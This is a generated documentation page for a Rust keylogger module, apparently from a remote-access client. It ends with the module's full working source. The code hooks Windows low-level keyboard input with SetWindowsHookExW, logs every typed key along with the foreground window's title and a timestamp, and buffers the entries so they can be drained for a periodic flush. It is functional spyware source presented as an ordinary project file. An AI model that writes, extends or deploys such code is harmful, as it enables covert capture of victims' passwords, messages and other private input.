# keylogger

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/keylogger.rs` |
| **Lines** | 221 |
| **Cards** | T023-client-capabilities |
| **Role** | Keylogger via hooks |
| **Unsafe blocks** | 2 |

## Constants

- `WM_KEYDOWN`: `usize` = `0x0100`
- `WM_SYSKEYDOWN`: `usize` = `0x0104`
- `LLKHF_INJECTED`: `u32` = `0x10`

## Types

### struct `KeylogEntry` (line 11)

### struct `Keylogger` (line 17)

## Public API

### `new` (line 25)
```rust
pub fn new() -> Self
```

### `start` (line 34)
```rust
pub fn start(&mut self)
```

### `stop` (line 51)
```rust
pub fn stop(&mut self)
```

### `is_active` (line 75)
```rust
pub fn is_active(&self) -> bool
```

### `drain` (line 80)
```rust
pub fn drain(&self) -> Vec<KeylogEntry>
```
Drain all buffered entries, returning them and clearing the buffer.

## Internal Functions

- `vk_to_char` (line 88)
- `run_hook` (line 113)
- `hook_proc` (unsafe) (line 131)
- `run_hook` (line 215)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use tracing::{info, error};`
- `use windows::Win32::UI::WindowsAndMessaging::*;`
- `use windows::Win32::Foundation::*;`
- `use windows::Win32::Foundation::*;`
- `use windows::Win32::UI::WindowsAndMessaging::*;`
- `use windows::Win32::System::Threading::GetCurrentThreadId;`

## Full Source

```rust
// Keylogger using WH_KEYBOARD_LL hook.
// Captures VK codes, maps them to readable chars/labels,
// tracks active window changes, buffers entries for periodic flush.

use std::sync::{Arc, Mutex};
use std::thread;
use serde::{Deserialize, Serialize};
use tracing::{info, error};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeylogEntry {
    pub window: String,
    pub keys: String,
    pub ts: u64,
}

pub struct Keylogger {
    buffer: Arc<Mutex<Vec<KeylogEntry>>>,
    active: Arc<std::sync::atomic::AtomicBool>,
    thread_id: Arc<Mutex<Option<u32>>>,
    _thread: Option<thread::JoinHandle<()>>,
}

impl Keylogger {
    pub fn new() -> Self {
        Keylogger {
            buffer: Arc::new(Mutex::new(Vec::new())),
            active: Arc::new(std::sync::atomic::AtomicBool::new(false)),
            thread_id: Arc::new(Mutex::new(None)),
            _thread: None,
        }
    }

    pub fn start(&mut self) {
        if self.active.load(std::sync::atomic::Ordering::SeqCst) {
            return;
        }
        self.active.store(true, std::sync::atomic::Ordering::SeqCst);

        let buffer = self.buffer.clone();
        let active = self.active.clone();
        let thread_id_store = self.thread_id.clone();

        let handle = thread::spawn(move || {
            run_hook(buffer, active, thread_id_store);
        });
        self._thread = Some(handle);
        info!("Keylogger started");
    }

    pub fn stop(&mut self) {
        if !self.active.load(std::sync::atomic::Ordering::SeqCst) {
            return;
        }
        self.active.store(false, std::sync::atomic::Ordering::SeqCst);

        // Post WM_QUIT to hook thread
        #[cfg(windows)]
        {
            if let Some(tid) = *self.thread_id.lock().unwrap() {
                unsafe {
                    use windows::Win32::UI::WindowsAndMessaging::*;
                    use windows::Win32::Foundation::*;
                    PostThreadMessageW(tid, WM_QUIT, WPARAM(0), LPARAM(0)).ok();
                }
            }
        }

        if let Some(handle) = self._thread.take() {
            let _ = handle.join();
        }
        info!("Keylogger stopped");
    }

    pub fn is_active(&self) -> bool {
        self.active.load(std::sync::atomic::Ordering::SeqCst)
    }

    /// Drain all buffered entries, returning them and clearing the buffer.
    pub fn drain(&self) -> Vec<KeylogEntry> {
        let mut buf = self.buffer.lock().unwrap();
        let batch = buf.clone();
        buf.clear();
        batch
    }
}

fn vk_to_char(vk: u32) -> String {
    match vk {
        0x08 => "[BKSP]".to_string(),
        0x09 => "[TAB]".to_string(),
        0x0D => "\n".to_string(),
        0x1B => "[ESC]".to_string(),
        0x20 => " ".to_string(),
        0x2E => "[DEL]".to_string(),
        0x25 => "[←]".to_string(),
        0x26 => "[↑]".to_string(),
        0x27 => "[→]".to_string(),
        0x28 => "[↓]".to_string(),
        0xA0 => "[LSHIFT]".to_string(),
        0xA1 => "[RSHIFT]".to_string(),
        0xA2 => "[LCTRL]".to_string(),
        0xA3 => "[RCTRL]".to_string(),
        0xA4 => "[LALT]".to_string(),
        0xA5 => "[RALT]".to_string(),
        0x5B => "[WIN]".to_string(),
        0x20..=0x7E => char::from_u32(vk).map(|c| c.to_string()).unwrap_or_else(|| format!("[{:02X}]", vk)),
        _ => format!("[{:02X}]", vk),
    }
}

#[cfg(windows)]
fn run_hook(
    buffer: Arc<Mutex<Vec<KeylogEntry>>>,
    active: Arc<std::sync::atomic::AtomicBool>,
    thread_id_store: Arc<Mutex<Option<u32>>>,
) {
    use windows::Win32::Foundation::*;
    use windows::Win32::UI::WindowsAndMessaging::*;
    use windows::Win32::System::Threading::GetCurrentThreadId;

    unsafe {
        let tid = GetCurrentThreadId();
        *thread_id_store.lock().unwrap() = Some(tid);

        // We need to share state with the hook callback.
        // Use a global slot (one keylogger at a time).
        HOOK_BUFFER.with(|hb| *hb.borrow_mut() = Some(buffer.clone()));
        HOOK_ACTIVE.with(|ha| *ha.borrow_mut() = Some(active.clone()));

        unsafe extern "system" fn hook_proc(
            code: i32,
            wparam: WPARAM,
            lparam: LPARAM,
        ) -> LRESULT {
            const WM_KEYDOWN: usize = 0x0100;
            const WM_SYSKEYDOWN: usize = 0x0104;
            const LLKHF_INJECTED: u32 = 0x10;

            if code >= 0 && (wparam.0 == WM_KEYDOWN || wparam.0 == WM_SYSKEYDOWN) {
                let kb = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
                let vk = kb.vkCode;

                // Skip injected (synthetic) keystrokes
                if (kb.flags.0 & LLKHF_INJECTED) == 0 {
                    let ch = vk_to_char(vk);
                    let win_title = crate::clipboard::get_active_window_title();
                    let ts = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_secs())
                        .unwrap_or(0);

                    HOOK_BUFFER.with(|hb| {
                        if let Some(buf) = hb.borrow().as_ref() {
                            if let Ok(mut guard) = buf.lock() {
                                // Check if last entry has same window and is not a window-change entry
                                let can_append = guard.last().map_or(false, |e| e.window == win_title);
                                if can_append {
                                    if let Some(last) = guard.last_mut() {
                                        last.keys.push_str(&ch);
                                        return;
                                    }
                                }
                                guard.push(KeylogEntry { window: win_title, keys: ch, ts });
                            }
                        }
                    });
                }
            }
            CallNextHookEx(HHOOK(0), code, wparam, lparam)
        }

        let hmod: windows::Win32::Foundation::HINSTANCE =
            windows::Win32::System::LibraryLoader::GetModuleHandleW(None)
                .unwrap_or_default()
                .into();

        let hook = match SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), hmod, 0) {
            Ok(h) => h,
            Err(e) => {
                error!("Failed to install keylogger hook: {}", e);
                return;
            }
        };

        // Message pump
        let mut msg = MSG::default();
        while active.load(std::sync::atomic::Ordering::SeqCst) {
            let ret = PeekMessageW(&mut msg, None, 0, 0, PM_REMOVE);
            if ret.as_bool() {
                if msg.message == WM_QUIT {
                    break;
                }
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            } else {
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }

        UnhookWindowsHookEx(hook).ok();
        info!("Keylogger hook uninstalled");
    }
}

#[cfg(windows)]
thread_local! {
    static HOOK_BUFFER: std::cell::RefCell<Option<Arc<Mutex<Vec<KeylogEntry>>>>> =
        std::cell::RefCell::new(None);
    static HOOK_ACTIVE: std::cell::RefCell<Option<Arc<std::sync::atomic::AtomicBool>>> =
        std::cell::RefCell::new(None);
}

#[cfg(not(windows))]
fn run_hook(
    _buffer: Arc<Mutex<Vec<KeylogEntry>>>,
    _active: Arc<std::sync::atomic::AtomicBool>,
    _thread_id_store: Arc<Mutex<Option<u32>>>,
) {
    // No-op on non-Windows
}

```